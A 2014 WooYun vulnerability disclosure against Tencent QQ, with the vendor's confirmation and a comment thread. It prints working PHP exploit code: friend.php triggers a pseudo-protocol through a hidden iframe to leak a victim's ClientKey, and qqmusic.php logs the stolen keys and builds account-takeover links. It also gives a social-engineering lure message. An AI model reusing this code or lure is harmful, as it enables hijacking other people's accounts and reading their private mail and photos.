{"id": 4439, "wybug_id": "wooyun-2014-054204", "wybug_title": "腾讯QQ某控件设计缺陷导致可远程登录任意QQ账号(已证明QQ空间、相册、微博、邮箱可登陆)", "wybug_corp": "腾讯", "wybug_author": "猪猪侠", "wybug_date": "2014-03-21 14:10", "wybug_open_date": "2014-05-05 14:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向公众公开  简要描述： 腾讯QQ客户端某默认安装空间存在严重安全缺陷，黑客可远程获取任意好友的ClientKEY；结合另外一个漏洞，即可绕过腾讯单点登陆系统的IP访问限制，登陆好友的QQ空间(围观QQ相册你懂的！)、QQ邮箱、QQ微博等QQ全线业务系统。 详细说明：  \n#详细的过程视频演示（更易懂）http://wydrops-wordpress.stor.sinaapp.com/uploads/2014/05/qq.wmv\n#1 测试环境操作系统：Windows8 X64 最新版本补丁QQ客户端：http://im.qq.com 下载的最新版 V 5.2 客户端程序 (2014年3月21日)\n\n#2 问题描述腾讯QQ客户端在安装时，会自动启用并在操作系统内注册多个自身产品控件，同时注册伪协议tencent:// 供自身产品调用。#3 问题细节腾讯QQ聊天窗口客户端有一个音乐分享功能，可供用户与用户之间进行音乐分享，由于本功能采用伪协议调用miniplayer(QQ空间音乐播放器)中的某个功能来播放音乐，其中mdlurl参数URL未做安全校验，导致直接将客户端的ClientKey附加为参数提交。我们只需要构造特定的mdlurl，制定到自己的服务器，就能成功截取到好友的ClientKEY了friend.php\n<?php$uinqq = $_GET['qq'];$request_url = \"tencent://miniplayer/?cmd=3&fuin=0&frienduin=\" . $uinqq . \"&action='accept'&mdlurl='http://bbs.m.qq.com/libs/qqmusic.php?songcount=1&songidlist=0&version=207&cmd=3&songnamelist=fuzz&singernamelist=success&songurllist=http%3A%2F%2Fstreamrdt.music.qq.com%2F4887.e3a65320e960cdf1b15d303b11495222%2F0%2Fa.mp3'&Exe=QQ\";$qzone_url = \"http://user.qzone.qq.com/?\" . $uinqq;echo '<html><meta http-equiv=\"refresh\" content=\"2;url=' . $qzone_url . '\">';echo \"<iframe src=\\\"\" . $request_url . \"\\\" height=0px width=0px></iframe></html>\";?>\n   漏洞证明：  #4 实战利用\n腾讯手机客户端推广计划，帮助好友加速升级！http://bbs.m.qq.com/friend.php?qq=63200!这个漏洞不受域名或者地域的限制，可以在任意页面引用带有伪协议的链接，就能获取到好友QQ的ClinetKEYhttp://www.wooyun.org/hello?qq=63200帮忙点一下呗？\n\n\n#5 好友互动当QQ好友点击那个链接后，我们即可接收到他的ClientKEY\n\n#6 成功获取到ClientKEYqqmusic.php\n<?php$qquin = $_GET['uin'];$clientkey = $_GET['key'];$raw_data = 'UIN: ' . $qquin . '  KEY:  <a href=\"http://clubclient.qq.com/clubclient_goto.php?uin=' . $qquin . '&key=' . $clientkey . '&sendclick=1&qptag=1&statid=10001903&gotourl=http://qzone.qq.com&tipsid=52684\" target=\"_blank\">' . $clientkey . '</a> ' . date('Y,m,d H:i:s'). '  :  ' . $_SERVER[\"REMOTE_ADDR\"] . \"<br>\";$fp = @fopen('../fuzzlog.html','a+');@fwrite($fp, \"$raw_data\");@fclose($fp);  ?>\n\n\n# QQ相册，QQ空间，呵呵\n\n   修复方案：  # 严格校验传递ClientKEY的URL是否为自身服务器   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-24 11:14 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-21 14:11 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  前排占位~    \n     2014-03-21 14:11 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  给你个棒棒糖，告诉我细节吧~    \n     2014-03-21 14:13 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  目测要火，前三占位。    \n     2014-03-21 14:14 |    \t\t摸了你 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:17        | 1shitMVqBjCKrnRvSoixMx6RKpG9J8pBM)\t\t \n  @猪猪侠 什么时候成功的进一回内网呀...好期待呀    \n     2014-03-21 14:14 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @摸了你 马上，第三发就可以见到了。    \n     2014-03-21 14:16 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n   @char 游族大牛，你们公司的SHELL可好？    \n     2014-03-21 14:27 |    \t\t小土豆 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:23        )\t\t \n  要火的节奏，求细节~    \n     2014-03-21 14:32 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  求进内网    \n     2014-03-21 14:37 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @摸了你 @孤独雪狼 求成功的进内网    \n     2014-03-21 14:38 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  求内网的    \n     2014-03-21 14:50 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  给你个棒棒糖，告诉我细节可以么！    \n     2014-03-21 14:57 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  给你个棒棒糖，告诉我细节可以么！     \n     2014-03-21 14:59 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  流弊    \n     2014-03-21 15:07 |    \t\t裙下的秘密 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:9        | )\t\t \n  围观    \n     2014-03-21 15:07 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  好屌    \n     2014-03-21 15:09 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  mark，好屌    \n     2014-03-21 15:10 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  终于来了，登陆任意QQ用户漏洞    \n     2014-03-21 15:13 |    \t\t龙臣 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | 人生就是一个缓慢被骗的过程。)\t\t \n  想看看马叔叔的相册啊    \n     2014-03-21 15:32 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  火钳刘明    \n     2014-03-21 15:42 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  好屌,火钳刘明    \n     2014-03-21 15:52 |    \t\tblackexp \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:13        | 一点一点的渗透到...)\t\t \n  太屌了吧！    \n     2014-03-21 15:56 |    \t\tdoosit \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | 木有介绍。)\t\t \n  好屌的说    \n     2014-03-21 16:16 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:832 漏洞数:113        | 相濡以沫，不如相忘于江湖)\t\t \n  mark    \n     2014-03-21 16:18 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  mark    \n     2014-03-21 16:21 |    \t\t木马游民 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:8        | I love LSD!)\t\t \n  你这么屌我都不知道    \n     2014-03-21 16:23 |    \t\t脚本菜菜 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 我只是混个邀请码。)\t\t \n  mark            \n     2014-03-21 16:35 |    \t\t飞扬风 \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:125        | 追求安全，热爱技术)\t\t \n  果断要火了    \n     2014-03-21 17:14 |    \t\tadmin1993 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 0101001010010100101001010010100101001010...)\t\t \n  mark    \n     2014-03-21 17:58 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  任意这个屌.....有前提吗？还是直接获取。。 碉堡！    \n     2014-03-21 17:58 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  @猪猪侠    \n     2014-03-21 18:03 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  碉堡了！中排占位。忽略 or rank5 or rank20？    \n     2014-03-21 18:07 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  @M4sk  同问，另外我想问，TM的QQ有这个洞吗？    \n     2014-03-21 18:31 |    \t\t‫‌ \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:14        )\t\t \n  猪哥V5    \n     2014-03-21 19:21 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  @小怿 。。。。猪哥V5    \n     2014-03-21 22:21 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  35楼也不算太迟吧。。    \n     2014-03-21 22:26 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  @Wangl 求@char公司内网shell    \n     2014-03-21 22:55 |    \t\t高斯 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  绕过SSO?怎么搞的？    \n     2014-03-22 07:59 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  以前发过类似的审核都不通过    \n     2014-03-22 09:24 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-03-22 10:10 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  刘明    \n     2014-03-22 13:04 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  够淫荡    \n     2014-03-22 19:11 |    \t\t路人5 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 你们别再问我是谁，你们可以叫我神奇的路人...)\t\t \n  mark     \n     2014-03-22 23:17 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  够NB    \n     2014-03-23 14:01 |    \t\t核攻击 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:7        | 统治全球，奴役全人类！毁灭任何胆敢阻拦的...)\t\t \n  各种mark    \n     2014-03-23 17:07 |    \t\t小火苗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 我是一只小火苗呀，春风吹又生呀...)\t\t \n  坐等内网漫游！    \n     2014-03-23 17:28 |    \t\txss_art \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | 只会弹框框的跨站师。。。。)\t\t \n  想知道怎么绕过ip访问控制。。。。关注。。。。    \n     2014-03-24 09:45 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  吊。。。。    \n     2014-03-24 10:28 |    \t\tDocee \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 屌丝)\t\t \n  霸气。。。已Mark.    \n     2014-03-24 10:51 |    \t\tDraycen \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  吊。。。。    \n     2014-03-24 22:38 |    \t\ttSt \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:7        | 在开发里运维最强，运维里网络最强，网络里...)\t\t \n  Mark    \n     2014-04-04 02:02 |    \t\t木马游民 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:8        | I love LSD!)\t\t \n  大神。    \n     2014-04-18 19:47 |    \t\tflying \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 呵呵)\t\t \n  期待进次内网    \n     2014-04-18 20:24 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  @flying 比起进内网，这个漏洞更吸引我    \n     2014-04-23 12:49 |    \t\twinsyk \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:16        | 越长大越孤单)\t\t \n  赞。    \n     2014-04-23 13:45 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  NB！！    \n     2014-04-23 15:48 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  这是已shell了bbs.m.qq.com？    \n     2014-04-24 21:08 |    \t\tKnight \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:10        | 刚刚上洗手间，看到一个玉树临风的少年，气...)\t\t \n  测试用的php文件部署在腾讯服务器上？    \n     2014-04-25 13:42 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:15        | .)\t\t \n  貌似已经shell了的样子    \n     2014-04-25 15:21 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @Coffee @Annabelle @Knight 以前shell过，同时这个漏洞不受域名或者地域的限制，可以在任意页面引用带有伪协议的链接，就能获取到好友QQ的ClinetKEY。    \n     2014-04-25 16:25 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @233 啥时候发的？    \n     2014-05-05 22:58 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  V5    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}